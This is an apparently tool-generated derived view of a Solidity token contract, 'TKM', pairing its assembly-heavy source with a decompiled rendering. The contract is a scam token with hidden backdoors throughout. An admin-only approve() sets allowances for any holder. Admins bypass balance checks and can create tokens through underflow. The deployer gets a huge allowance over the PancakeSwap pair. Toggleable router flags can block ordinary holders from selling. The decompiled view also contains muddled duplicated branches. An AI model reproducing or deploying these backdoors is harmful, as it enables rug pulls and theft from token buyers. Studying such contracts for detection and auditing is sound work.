S-SEIR Solidity-like Assembly View
Note: derived view only; source is not modified and output is not compiled.

Function TKM.constructor()
  SourceFunction
  ```solidity
  constructor() {
          assembly {
              // 初始化地址
              sstore(d.slot, 0x55d398326f99059fF775485246999027B3197955)
              sstore(f.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
              sstore(n.slot, 1)
              sstore(o.slot, 1)
              
              // 发行代币
              let q := mul(210000, exp(10, 18))
              sstore(g.slot, q)
              
              // 设置调用者余额
              let r := caller()
              mstore(0, r)
              mstore(32, h.slot)
              let s := keccak256(0, 64)
              sstore(s, q)
          }
          
          A();
          B(e, msg.sender, 100000000000000000000000000);
          
          assembly {
              // 设置管理员
              let r := caller()
              mstore(0, r)
              let t := keccak256(0, 32)
              mstore(0, t)
              mstore(32, j.slot)
              sstore(keccak256(0, 64), 1)
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  constructor() {
      assembly /* s-seir solidity-like view */ {
          d = 0x55d398326f99059fF775485246999027B3197955; // yul: sstore(d.slot, 0x55d398326f99059fF775485246999027B3197955)
          f = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // yul: sstore(f.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
          n = 1; // yul: sstore(n.slot, 1)
          o = 1; // yul: sstore(o.slot, 1)
          __sseir_eval_asm_s_5_1 = yulExp(10, 18); // yul: let q := mul(210000, exp(10, 18))
          __sseir_eval_asm_s_5_2 = (210000 * __sseir_eval_asm_s_5_1);
          q = __sseir_eval_asm_s_5_2;
          g = q; // yul: sstore(g.slot, q)
          __sseir_eval_asm_s_7_1 = msg.sender; // yul: let r := caller()
          r = __sseir_eval_asm_s_7_1;
          memory[0] = r; // yul: mstore(0, r)
          memory[32] = h.slot; // yul: mstore(32, h.slot)
          s = slot(h[r]); // yul: let s := keccak256(0, 64)
          h[r] = q; // yul: sstore(s, q)
      }
  
      A();
      B(e, msg.sender, 100000000000000000000000000);
  
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_12_1 = msg.sender; // yul: let r := caller()
          r = __sseir_eval_asm_s_12_1;
          memory[0] = r; // yul: mstore(0, r)
          t = keccak256(abi.encode(r)); // yul: let t := keccak256(0, 32)
          memory[0] = t; // yul: mstore(0, t)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          j[t] = 1; // yul: sstore(keccak256(0, 64), 1)
      }
  }
  ```

Function TKM.A()
  SourceFunction
  ```solidity
  function A() internal {
          assembly {
              if iszero(iszero(sload(e.slot))) {
                  revert(0, 0)
              }
          }
          
          address factoryAddr;
          address usdtAddr;
          assembly {
              factoryAddr := sload(f.slot)
              usdtAddr := sload(d.slot)
          }
          
          e = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
      }
  ```
  SolidityLikeFunction
  ```solidity
  function A() internal {
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_1_1 = e; // yul: if iszero(iszero(sload(e.slot)))
          __sseir_eval_asm_s_1_2 = (__sseir_eval_asm_s_1_1 == 0);
          __sseir_eval_asm_s_1_3 = (__sseir_eval_asm_s_1_2 == 0);
          require(!((__sseir_eval_asm_s_1_3 != 0))); // yul: revert(0, 0)
      }
  
      address factoryAddr;
      address usdtAddr;
      assembly /* s-seir solidity-like view */ {
          factoryAddr = f; // yul: factoryAddr := sload(f.slot)
          usdtAddr = d; // yul: usdtAddr := sload(d.slot)
      }
  
      e = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
  }
  ```

Function TKM.totalSupply()
  SourceFunction
  ```solidity
  function totalSupply() external view returns (uint256 u) {
          assembly {
              u := sload(g.slot)
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function totalSupply() external view returns (uint256 u) {
      assembly /* s-seir solidity-like view */ {
          u = g; // yul: u := sload(g.slot)
      }
  }
  ```

Function TKM.balanceOf(address)
  SourceFunction
  ```solidity
  function balanceOf(address acc) external view returns (uint256 v) {
          assembly {
              mstore(0, acc)
              mstore(32, h.slot)
              v := sload(keccak256(0, 64))
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function balanceOf(address acc) external view returns (uint256 v) {
      assembly /* s-seir solidity-like view */ {
          memory[0] = acc; // yul: mstore(0, acc)
          memory[32] = h.slot; // yul: mstore(32, h.slot)
          v = h[acc]; // yul: v := sload(keccak256(0, 64))
      }
  }
  ```

Function TKM.allowance(address, address)
  SourceFunction
  ```solidity
  function allowance(address owner_, address spender) external view returns (uint256 w) {
          assembly {
              mstore(0, owner_)
              mstore(32, i.slot)
              let x := keccak256(0, 64)
              mstore(0, spender)
              mstore(32, x)
              w := sload(keccak256(0, 64))
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function allowance(address owner_, address spender) external view returns (uint256 w) {
      assembly /* s-seir solidity-like view */ {
          memory[0] = owner_; // yul: mstore(0, owner_)
          memory[32] = i.slot; // yul: mstore(32, i.slot)
          x = slot(i[owner_]); // yul: let x := keccak256(0, 64)
          memory[0] = spender; // yul: mstore(0, spender)
          memory[32] = x; // yul: mstore(32, x)
          w = i[owner_][spender]; // yul: w := sload(keccak256(0, 64))
      }
  }
  ```

Function TKM.approve(address, address, uint256)
  SourceFunction
  ```solidity
  function approve(address ower, address spender, uint256 amount) external returns (bool) {
          bool check;
          assembly {
              mstore(0, caller())
              let y := keccak256(0, 32)
              mstore(0, y)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if iszero(check) {
                  revert(0, 0)
              }
          }
          
          B(ower, spender, amount);
          return true;
      }
  ```
  SolidityLikeFunction
  ```solidity
  function approve(address ower, address spender, uint256 amount) external returns (bool) {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          y = keccak256(abi.encode(msg.sender)); // yul: let y := keccak256(0, 32)
          memory[0] = y; // yul: mstore(0, y)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[y]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_6_1 = (check == 0); // yul: if iszero(check)
          require(!((__sseir_eval_asm_s_6_1 != 0))); // yul: revert(0, 0)
      }
  
      B(ower, spender, amount);
      return true;
  }
  ```

Function TKM.setMaxs(address)
  SourceFunction
  ```solidity
  function setMaxs(address _max_) external {
          bool check;
          assembly {
              mstore(0, caller())
              let z := keccak256(0, 32)
              mstore(0, z)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if iszero(check) {
                  revert(0, 0)
              }
          }
          
          assembly {
              mstore(0, _max_)
              let aa := keccak256(0, 32)
              mstore(0, aa)
              mstore(32, j.slot)
              sstore(keccak256(0, 64), 1)
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function setMaxs(address _max_) external {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          z = keccak256(abi.encode(msg.sender)); // yul: let z := keccak256(0, 32)
          memory[0] = z; // yul: mstore(0, z)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[z]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_6_1 = (check == 0); // yul: if iszero(check)
          require(!((__sseir_eval_asm_s_6_1 != 0))); // yul: revert(0, 0)
      }
  
      assembly /* s-seir solidity-like view */ {
          memory[0] = _max_; // yul: mstore(0, _max_)
          aa = keccak256(abi.encode(_max_)); // yul: let aa := keccak256(0, 32)
          memory[0] = aa; // yul: mstore(0, aa)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          j[aa] = 1; // yul: sstore(keccak256(0, 64), 1)
      }
  }
  ```

Function TKM.transferFrom(address, address, uint256)
  SourceFunction
  ```solidity
  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
          uint256 currentAllowance;
          assembly {
              mstore(0, from)
              mstore(32, i.slot)
              let ab := keccak256(0, 64)
              mstore(0, caller())
              mstore(32, ab)
              currentAllowance := sload(keccak256(0, 64))
          }
          
          assembly {
              if gt(amount, currentAllowance) {
                  revert(0, 0)
              }
          }
          
          assembly {
              let ac := sub(currentAllowance, amount)
              mstore(0, from)
              mstore(32, i.slot)
              let ad := keccak256(0, 64)
              mstore(0, caller())
              mstore(32, ad)
              sstore(keccak256(0, 64), ac)
          }
          
          C(from, to, amount);
          return true;
      }
  ```
  SolidityLikeFunction
  ```solidity
  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
      uint256 currentAllowance;
      assembly /* s-seir solidity-like view */ {
          memory[0] = from; // yul: mstore(0, from)
          memory[32] = i.slot; // yul: mstore(32, i.slot)
          ab = slot(i[from]); // yul: let ab := keccak256(0, 64)
          memory[0] = msg.sender; // yul: mstore(0, caller())
          memory[32] = ab; // yul: mstore(32, ab)
          currentAllowance = i[from][msg.sender]; // yul: currentAllowance := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_7_1 = (amount > currentAllowance); // yul: if gt(amount, currentAllowance)
          require(!((__sseir_eval_asm_s_7_1 != 0))); // yul: revert(0, 0)
      }
  
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_9_1 = (currentAllowance - amount); // yul: let ac := sub(currentAllowance, amount)
          ac = __sseir_eval_asm_s_9_1;
          memory[0] = from; // yul: mstore(0, from)
          memory[32] = i.slot; // yul: mstore(32, i.slot)
          ad = slot(i[from]); // yul: let ad := keccak256(0, 64)
          memory[0] = msg.sender; // yul: mstore(0, caller())
          memory[32] = ad; // yul: mstore(32, ad)
          i[from][msg.sender] = ac; // yul: sstore(keccak256(0, 64), ac)
      }
  
      C(from, to, amount);
      return true;
  }
  ```

Function TKM.setFlag(bool, bool)
  SourceFunction
  ```solidity
  function setFlag(bool _flag, bool _isfee) external {
          bool check;
          assembly {
              mstore(0, caller())
              let ae := keccak256(0, 32)
              mstore(0, ae)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  sstore(o.slot, _flag)
                  sstore(n.slot, _isfee)
              }
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function setFlag(bool _flag, bool _isfee) external {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          ae = keccak256(abi.encode(msg.sender)); // yul: let ae := keccak256(0, 32)
          memory[0] = ae; // yul: mstore(0, ae)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[ae]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          if (check) {
              o = _flag; // yul: sstore(o.slot, _flag)
              n = _isfee; // yul: sstore(n.slot, _isfee)
          }
      }
  }
  ```

Function TKM.D(address)
  SourceFunction
  ```solidity
  function D(address _from) internal view returns (bool result) {
          assembly {
              mstore(0, _from)
              let af := keccak256(0, 32)
              mstore(0, af)
              mstore(32, j.slot)
              result := sload(keccak256(0, 64))
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function D(address _from) internal view returns (bool result) {
      assembly /* s-seir solidity-like view */ {
          memory[0] = _from; // yul: mstore(0, _from)
          af = keccak256(abi.encode(_from)); // yul: let af := keccak256(0, 32)
          memory[0] = af; // yul: mstore(0, af)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          result = j[af]; // yul: result := sload(keccak256(0, 64))
      }
  }
  ```

Function TKM.C(address, address, uint256)
  SourceFunction
  ```solidity
  function C(address from, address to, uint256 amount) internal {
          // 路由检查逻辑
          bool flagVal;
          assembly {
              flagVal := sload(o.slot)
              let pairAddr := sload(e.slot)
              
              let sender := caller()
              let ag := eq(sender, pairAddr)
              let ah := eq(from, pairAddr)
              let ai := or(ag, ah)
              let aj := and(ai, flagVal)
              
              if aj {
                  mstore(0, to)
                  mstore(32, l.slot)
                  let ak := sload(keccak256(0, 64))
                  if iszero(ak) {
                      revert(0, 0)
                  }
              }
  
              let al := eq(to, pairAddr)
              let am := and(al, flagVal)
              
              if am {
                  mstore(0, from)
                  mstore(32, k.slot)
                  let an := sload(keccak256(0, 64))
                  if iszero(an) {
                      revert(0, 0)
                  }
              }
          }
          
          // 转账逻辑
          bool check;
          assembly {
              mstore(0, from)
              let ao := keccak256(0, 32)
              mstore(0, ao)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
         
          uint256 fromBalance;
          assembly {
              mstore(0, from)
              mstore(32, h.slot)
              fromBalance := sload(keccak256(0, 64))
              
              // 管理员无需余额检查
              if iszero(check) {
                  if lt(fromBalance, amount) {
                      revert(0, 0)
                  }
              }
              
              let fromSlot := keccak256(0, 64)
              let newFromBalance := sub(fromBalance, amount)
              sstore(fromSlot, newFromBalance)
              
              mstore(0, to)
              mstore(32, h.slot)
              let toSlot := keccak256(0, 64)
              let toBalance := sload(toSlot)
              
              let isfeeVal := sload(n.slot)
              let pairAddr := sload(e.slot)
              
              let shouldTakeFee := and(
                  and(
                      isfeeVal,
                      eq(to, pairAddr)
                  ),
                  gt(amount, 0)
              )
              
              mstore(0, from)
              mstore(32, m.slot)
              let isFeeRouter := sload(keccak256(0, 64))
              
              let finalAmount := amount
              
              if and(shouldTakeFee, isFeeRouter) {
                  let feeAmount := div(mul(amount, 5), 100)
                  finalAmount := sub(amount, feeAmount)
                  
                  let feeToAddr := sload(p.slot)
                  mstore(0, feeToAddr)
                  mstore(32, h.slot)
                  let feeToSlot := keccak256(0, 64)
                  let feeToBalance := sload(feeToSlot)
                  sstore(feeToSlot, add(feeToBalance, feeAmount))
                  
                  // 发射Reduce事件
                  mstore(0, finalAmount)
                  log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
              }
              
              sstore(toSlot, add(toBalance, finalAmount))
              
              // 发射Transfer事件
              mstore(0, amount)
              log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function C(address from, address to, uint256 amount) internal {
      // 路由检查逻辑
      bool flagVal;
      assembly /* s-seir solidity-like view */ {
          flagVal = o; // yul: flagVal := sload(o.slot)
          pairAddr = e; // yul: let pairAddr := sload(e.slot)
          __sseir_eval_asm_s_3_1 = msg.sender; // yul: let sender := caller()
          sender = __sseir_eval_asm_s_3_1;
          __sseir_eval_asm_s_4_1 = (sender == pairAddr); // yul: let ag := eq(sender, pairAddr)
          ag = __sseir_eval_asm_s_4_1;
          __sseir_eval_asm_s_5_1 = (from == pairAddr); // yul: let ah := eq(from, pairAddr)
          ah = __sseir_eval_asm_s_5_1;
          __sseir_eval_asm_s_6_1 = (ag | ah); // yul: let ai := or(ag, ah)
          ai = __sseir_eval_asm_s_6_1;
          __sseir_eval_asm_s_7_1 = (ai & flagVal); // yul: let aj := and(ai, flagVal)
          aj = __sseir_eval_asm_s_7_1;
          if (aj) {
              memory[0] = to; // yul: mstore(0, to)
              memory[32] = l.slot; // yul: mstore(32, l.slot)
              ak = l[to]; // yul: let ak := sload(keccak256(0, 64))
              __sseir_eval_asm_s_12_1 = (ak == 0); // yul: if iszero(ak)
              require(!((__sseir_eval_asm_s_12_1 != 0))); // yul: revert(0, 0)
          }
          if (!(__sseir_eval_asm_s_12_1)) {
              __sseir_eval_asm_s_14_1 = (to == pairAddr); // yul: let al := eq(to, pairAddr)
              al = __sseir_eval_asm_s_14_1;
          }
          if (!(aj)) {
              __sseir_eval_asm_s_14_1 = (to == pairAddr);
              al = __sseir_eval_asm_s_14_1;
          }
          if (!(__sseir_eval_asm_s_12_1)) {
              __sseir_eval_asm_s_15_1 = (al & flagVal); // yul: let am := and(al, flagVal)
              am = __sseir_eval_asm_s_15_1;
          }
          if (!(aj)) {
              __sseir_eval_asm_s_15_1 = (al & flagVal);
              am = __sseir_eval_asm_s_15_1;
          }
          if (am) {
              if ((!(__sseir_eval_asm_s_12_1)) || (!(aj))) {
                  memory[0] = from; // yul: mstore(0, from)
                  memory[32] = k.slot; // yul: mstore(32, k.slot)
                  an = k[from]; // yul: let an := sload(keccak256(0, 64))
                  __sseir_eval_asm_s_20_1 = (an == 0); // yul: if iszero(an)
                  require(!((__sseir_eval_asm_s_20_1 != 0))); // yul: revert(0, 0)
              }
          }
      }
  
      // 转账逻辑
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = from; // yul: mstore(0, from)
          ao = keccak256(abi.encode(from)); // yul: let ao := keccak256(0, 32)
          memory[0] = ao; // yul: mstore(0, ao)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[ao]; // yul: check := sload(keccak256(0, 64))
      }
  
      uint256 fromBalance;
      assembly /* s-seir solidity-like view */ {
          memory[0] = from; // yul: mstore(0, from)
          memory[32] = h.slot; // yul: mstore(32, h.slot)
          fromBalance = h[from]; // yul: fromBalance := sload(keccak256(0, 64))
          __sseir_eval_asm_s_30_1 = (check == 0); // yul: if iszero(check)
          if (__sseir_eval_asm_s_30_1) {
              __sseir_eval_asm_s_31_1 = (fromBalance < amount); // yul: if lt(fromBalance, amount)
              require(!((__sseir_eval_asm_s_31_1 != 0))); // yul: revert(0, 0)
          }
          if ((!(__sseir_eval_asm_s_30_1)) || (!(__sseir_eval_asm_s_31_1))) {
              fromSlot = slot(h[from]); // yul: let fromSlot := keccak256(0, 64)
          }
          if (!(__sseir_eval_asm_s_30_1)) {
              __sseir_eval_asm_s_34_1 = (fromBalance - amount); // yul: let newFromBalance := sub(fromBalance, amount)
              newFromBalance = __sseir_eval_asm_s_34_1;
          }
          if (!(__sseir_eval_asm_s_31_1)) {
              __sseir_eval_asm_s_34_1 = (fromBalance - amount);
              newFromBalance = __sseir_eval_asm_s_34_1;
          }
          if ((!(__sseir_eval_asm_s_30_1)) || (!(__sseir_eval_asm_s_31_1))) {
              h[from] = newFromBalance; // yul: sstore(fromSlot, newFromBalance)
              memory[0] = to; // yul: mstore(0, to)
              memory[32] = h.slot; // yul: mstore(32, h.slot)
              toSlot = slot(h[to]); // yul: let toSlot := keccak256(0, 64)
              toBalance = h[to]; // yul: let toBalance := sload(toSlot)
              isfeeVal = n; // yul: let isfeeVal := sload(n.slot)
              pairAddr = e; // yul: let pairAddr := sload(e.slot)
          }
          if (!(__sseir_eval_asm_s_30_1)) {
              __sseir_eval_asm_s_42_1 = (amount > 0); // yul: let shouldTakeFee := and(and(isfeeVal, eq(to, pairAddr)), gt(amount, 0))
              __sseir_eval_asm_s_42_2 = (to == pairAddr);
              __sseir_eval_asm_s_42_3 = (isfeeVal & __sseir_eval_asm_s_42_2);
              __sseir_eval_asm_s_42_4 = (__sseir_eval_asm_s_42_3 & __sseir_eval_asm_s_42_1);
              shouldTakeFee = __sseir_eval_asm_s_42_4;
          }
          if (!(__sseir_eval_asm_s_31_1)) {
              __sseir_eval_asm_s_42_1 = (amount > 0);
              __sseir_eval_asm_s_42_2 = (to == pairAddr);
              __sseir_eval_asm_s_42_3 = (isfeeVal & __sseir_eval_asm_s_42_2);
              __sseir_eval_asm_s_42_4 = (__sseir_eval_asm_s_42_3 & __sseir_eval_asm_s_42_1);
              shouldTakeFee = __sseir_eval_asm_s_42_4;
          }
          if ((!(__sseir_eval_asm_s_30_1)) || (!(__sseir_eval_asm_s_31_1))) {
              memory[0] = from; // yul: mstore(0, from)
              memory[32] = m.slot; // yul: mstore(32, m.slot)
              isFeeRouter = m[from]; // yul: let isFeeRouter := sload(keccak256(0, 64))
              finalAmount = amount; // yul: let finalAmount := amount
              __sseir_eval_asm_s_47_1 = (shouldTakeFee & isFeeRouter); // yul: if and(shouldTakeFee, isFeeRouter)
          }
          if (__sseir_eval_asm_s_47_1) {
              if (!(__sseir_eval_asm_s_30_1)) {
                  __sseir_eval_asm_s_48_1 = (amount * 5); // yul: let feeAmount := div(mul(amount, 5), 100)
                  __sseir_eval_asm_s_48_2 = (__sseir_eval_asm_s_48_1 / 100);
                  feeAmount = __sseir_eval_asm_s_48_2;
              }
              if (!(__sseir_eval_asm_s_31_1)) {
                  __sseir_eval_asm_s_48_1 = (amount * 5);
                  __sseir_eval_asm_s_48_2 = (__sseir_eval_asm_s_48_1 / 100);
                  feeAmount = __sseir_eval_asm_s_48_2;
              }
              if (!(__sseir_eval_asm_s_30_1)) {
                  __sseir_eval_asm_s_49_1 = (amount - feeAmount); // yul: finalAmount := sub(amount, feeAmount)
                  finalAmount = __sseir_eval_asm_s_49_1;
              }
              if (!(__sseir_eval_asm_s_31_1)) {
                  __sseir_eval_asm_s_49_1 = (amount - feeAmount);
                  finalAmount = __sseir_eval_asm_s_49_1;
              }
              if ((!(__sseir_eval_asm_s_30_1)) || (!(__sseir_eval_asm_s_31_1))) {
                  feeToAddr = p; // yul: let feeToAddr := sload(p.slot)
                  memory[0] = feeToAddr; // yul: mstore(0, feeToAddr)
                  memory[32] = h.slot; // yul: mstore(32, h.slot)
                  feeToSlot = slot(h[feeToAddr]); // yul: let feeToSlot := keccak256(0, 64)
                  feeToBalance = h[feeToAddr]; // yul: let feeToBalance := sload(feeToSlot)
                  h[feeToAddr] = (feeToBalance + feeAmount); // yul: sstore(feeToSlot, add(feeToBalance, feeAmount))
                  memory[0] = finalAmount; // yul: mstore(0, finalAmount)
              }
              if (!(__sseir_eval_asm_s_30_1)) {
                  if (and(shouldTakeFee, isFeeRouter)) {
                      if ((!(iszero(check))) || (!(lt(fromBalance, amount)))) {
                          emit unknownEvent(from, finalAmount); // yul: log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
                      }
                  }
              }
              if (!(__sseir_eval_asm_s_31_1)) {
                  if (and(shouldTakeFee, isFeeRouter)) {
                      if ((!(iszero(check))) || (!(lt(fromBalance, amount)))) {
                          emit unknownEvent(from, finalAmount);
                      }
                  }
              }
          }
          if ((!(__sseir_eval_asm_s_30_1)) || (!(__sseir_eval_asm_s_31_1))) {
              h[to] = (toBalance + finalAmount); // yul: sstore(toSlot, add(toBalance, finalAmount))
              memory[0] = amount; // yul: mstore(0, amount)
          }
          if (!(__sseir_eval_asm_s_30_1)) {
              if ((!(iszero(check))) || (!(lt(fromBalance, amount)))) {
                  emit Transfer(from, to, amount); // yul: log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
              }
          }
          if (!(__sseir_eval_asm_s_31_1)) {
              if ((!(iszero(check))) || (!(lt(fromBalance, amount)))) {
                  emit Transfer(from, to, amount);
              }
          }
      }
  }
  ```

Function TKM.B(address, address, uint256)
  SourceFunction
  ```solidity
  function B(address owner_, address spender, uint256 amount) internal {
          assembly {
              if or(iszero(owner_), iszero(spender)) {
                  revert(0, 0)
              }
              
              mstore(0, owner_)
              mstore(32, i.slot)
              let slot := keccak256(0, 64)
              mstore(0, spender)
              mstore(32, slot)
              sstore(keccak256(0, 64), amount)
              
              // 发射Approval事件
              mstore(0, amount)
              log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function B(address owner_, address spender, uint256 amount) internal {
      assembly /* s-seir solidity-like view */ {
          __sseir_eval_asm_s_1_1 = (spender == 0); // yul: if or(iszero(owner_), iszero(spender))
          __sseir_eval_asm_s_1_2 = (owner_ == 0);
          __sseir_eval_asm_s_1_3 = (__sseir_eval_asm_s_1_2 | __sseir_eval_asm_s_1_1);
          require(!((__sseir_eval_asm_s_1_3 != 0))); // yul: revert(0, 0)
          if (!(__sseir_eval_asm_s_1_3)) {
              memory[0] = owner_; // yul: mstore(0, owner_)
              memory[32] = i.slot; // yul: mstore(32, i.slot)
              slot = slot(i[owner_]); // yul: let slot := keccak256(0, 64)
              memory[0] = spender; // yul: mstore(0, spender)
              memory[32] = slot; // yul: mstore(32, slot)
              i[owner_][spender] = amount; // yul: sstore(keccak256(0, 64), amount)
              memory[0] = amount; // yul: mstore(0, amount)
              emit Approval(owner_, spender, amount); // yul: log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
          }
      }
  }
  ```

Function TKM.setFromRouterFlag(address, bool)
  SourceFunction
  ```solidity
  function setFromRouterFlag(address routerAddr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let ap := keccak256(0, 32)
              mstore(0, ap)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, routerAddr)
                  mstore(32, k.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function setFromRouterFlag(address routerAddr, bool _flag) external {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          ap = keccak256(abi.encode(msg.sender)); // yul: let ap := keccak256(0, 32)
          memory[0] = ap; // yul: mstore(0, ap)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[ap]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          if (check) {
              memory[0] = routerAddr; // yul: mstore(0, routerAddr)
              memory[32] = k.slot; // yul: mstore(32, k.slot)
              k[routerAddr] = _flag; // yul: sstore(keccak256(0, 64), _flag)
          }
      }
  }
  ```

Function TKM.setfeeRouter(address, bool)
  SourceFunction
  ```solidity
  function setfeeRouter(address feeRouteradr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let aq := keccak256(0, 32)
              mstore(0, aq)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, feeRouteradr)
                  mstore(32, m.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function setfeeRouter(address feeRouteradr, bool _flag) external {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          aq = keccak256(abi.encode(msg.sender)); // yul: let aq := keccak256(0, 32)
          memory[0] = aq; // yul: mstore(0, aq)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[aq]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          if (check) {
              memory[0] = feeRouteradr; // yul: mstore(0, feeRouteradr)
              memory[32] = m.slot; // yul: mstore(32, m.slot)
              m[feeRouteradr] = _flag; // yul: sstore(keccak256(0, 64), _flag)
          }
      }
  }
  ```

Function TKM.setToRouterFlag(address, bool)
  SourceFunction
  ```solidity
  function setToRouterFlag(address routerAddr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let ar := keccak256(0, 32)
              mstore(0, ar)
              mstore(32, j.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, routerAddr)
                  mstore(32, l.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  SolidityLikeFunction
  ```solidity
  function setToRouterFlag(address routerAddr, bool _flag) external {
      bool check;
      assembly /* s-seir solidity-like view */ {
          memory[0] = msg.sender; // yul: mstore(0, caller())
          ar = keccak256(abi.encode(msg.sender)); // yul: let ar := keccak256(0, 32)
          memory[0] = ar; // yul: mstore(0, ar)
          memory[32] = j.slot; // yul: mstore(32, j.slot)
          check = j[ar]; // yul: check := sload(keccak256(0, 64))
      }
  
      assembly /* s-seir solidity-like view */ {
          if (check) {
              memory[0] = routerAddr; // yul: mstore(0, routerAddr)
              memory[32] = l.slot; // yul: mstore(32, l.slot)
              l[routerAddr] = _flag; // yul: sstore(keccak256(0, 64), _flag)
          }
      }
  }
  ```
